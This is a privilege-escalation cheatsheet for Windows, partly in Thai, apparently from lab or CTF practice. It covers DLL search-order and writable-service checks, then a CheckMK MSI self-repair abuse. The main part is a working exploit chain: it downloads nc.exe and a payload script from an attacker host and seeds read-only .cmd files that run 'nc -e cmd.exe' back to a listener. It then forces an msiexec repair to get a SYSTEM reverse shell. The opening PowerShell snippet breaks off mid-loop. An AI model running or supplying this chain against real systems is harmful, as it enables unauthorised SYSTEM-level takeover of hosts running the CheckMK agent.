# Check writable folders in PATH (DLL search order abuse)
$env:Path.Split(';') | ForEach-Object {
  $p = $_.Trim()
  if ($p -and (Test-Path $p)) {
    $acl = (icacls $p) -join "`n"

### Find Writable Service Directories

```powershell
# Find service folders writable by Users
Get-WmiObject -Class Win32_Service | ForEach-Object {
  $svc = $_
  if (-not $svc.PathName) { return }
  $exe = ($svc.PathName -replace '"','').Split(' ')[0]
  if (-not $exe) { return }
  $folder = Split-Path $exe -ErrorAction SilentlyContinue
  if (-not $folder -or -not (Test-Path $folder)) { return }
  if ($folder -match [regex]::Escape($env:windir) -and $folder -match 'System32') { return }
  try { $aclText = icacls $folder 2>$null } catch { $aclText = $null }
  if ($aclText -and ($aclText -match 'Users.*M' -or $aclText -match 'Everyone.*M')) {
    [PSCustomObject]@{
      Service = $svc.Name
      ExePath = $exe
      Folder = $folder
    }
  }
} | Format-Table -AutoSize
```

```Note
 The specific search order is the following one

  1. The folder specified by `lpFileName' (Current folder with exe)
  2. System folder, get using `GetSystemDirectory()' (C:\Windows\System32)
  3. 16-bit system folder (not so important now)
  4. Windows directory, get using `GetWindowsDirectory()' (C:\Windows)
  5. Current directory
  6. Directories listed in the `PATH'

  In this case we have a problem when the attacker is able to introduce
  a malicious DLL in a position that has priority over the regular
  DLL. For example:

  - The regular DLL is found within the Windows Directory (C:\Windows)
  - The malicious DLL is found within the System Folder
    (C:\Windows\System32)
```

# CheckMK MSI Repair Abuse — Privesc Cheatsheet

## Overview

**Technique:** MSI Self-Repair Abuse → SYSTEM code execution  
**Requirement:** writable `C:\Windows\Temp` + CheckMK agent installed  
**Result:** NT AUTHORITY\SYSTEM reverse shell

---

## Detection

```bash
# ตรวจสอบ CheckMK agent จากนอก
nc <target> 6556
<<<check_mk>>>
# ถ้าตอบ Version: x.x.x = มี CheckMK agent ทำงานอยู่
```

---

## Attack Chain

```
CheckMK agent running (port 6556)
→ MSI ติดตั้งอยู่ในระบบ (run installer as SYSTEM)
→ MSI repair extract temp .cmd files → C:\Windows\Temp\cmk_all_<PID>_<CTR>.cmd
→ seed read-only files ตาม pattern ก่อน
→ MSI repair ใช้ file ของเราแทน
→ SYSTEM execute .cmd → reverse shell
```

---

## Steps

### 1. Compile RunasCs (ถ้ายังไม่มี binary)

```powershell
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe -target:exe -optimize -out:RunasCs.exe RunasCs.cs
```

### 2. Upload nc.exe

```powershell
(New-Object Net.WebClient).DownloadFile("http://<LHOST>/nc.exe", "C:\Windows\Temp\nc.exe")
```

### 3. bad.ps1 — payload script

```powershell
param(
    [int]$MinPID = 1000,
    [int]$MaxPID = 15000,
    [string]$LHOST = "10.10.15.15",
    [string]$LPORT = "9001"
)
$NcPath = "C:\Windows\Temp\nc.exe"
$BatchPayload = "@echo off`r`n$NcPath -e cmd.exe $LHOST $LPORT"

$msi = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties' -ErrorAction SilentlyContinue |
        Where-Object { $_.DisplayName -like '*mk*' } |
        Select-Object -First 1).LocalPackage

if (!$msi) { Write-Error "Could not find Checkmk MSI"; return }
Write-Host "[*] Found MSI at $msi"

foreach ($ctr in 0..1) {
    for ($num = $MinPID; $num -le $MaxPID; $num++) {
        $filePath = "C:\Windows\Temp\cmk_all_$($num)_$($ctr).cmd"
        try {
            [System.IO.File]::WriteAllText($filePath, $BatchPayload, [System.Text.Encoding]::ASCII)
            Set-ItemProperty -Path $filePath -Name IsReadOnly -Value $true -ErrorAction SilentlyContinue
        } catch {}
    }
}
Write-Host "[*] Seeding complete."
Start-Process "msiexec.exe" -ArgumentList "/fa `"$msi`" /qn /l*vx C:\Windows\Temp\cmk_repair.log" -Wait
Write-Host "[*] Trigger sent."
```

### 4. Upload bad.ps1

```powershell
(New-Object Net.WebClient).DownloadFile("http://<LHOST>/bad.ps1", "C:\Windows\Temp\bad.ps1")
```

### 5. เปิด listener

```bash
nc -lvnp 9001
```

### 6. Trigger via RunasCs

```powershell
.\RunasCs.exe web_svc "<password>" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Windows\Temp\bad.ps1" -l 8
```

---

## Why it works

|ส่วน|เหตุผล|
|---|---|
|`msiexec /fa`|force repair — re-extract และ re-execute CustomAction|
|MSI runs as SYSTEM|Windows Installer service = `NT AUTHORITY\SYSTEM`|
|Read-only seed files|MSI ไม่ overwrite read-only → ใช้ file ของเราแทน|
|`cmk_all_<PID>_<CTR>.cmd`|pattern ที่ CheckMK MSI จะเรียกตอน repair|
|RunasCs|run bad.ps1 ใน context ของ user ที่มีสิทธิ์ trigger repair|
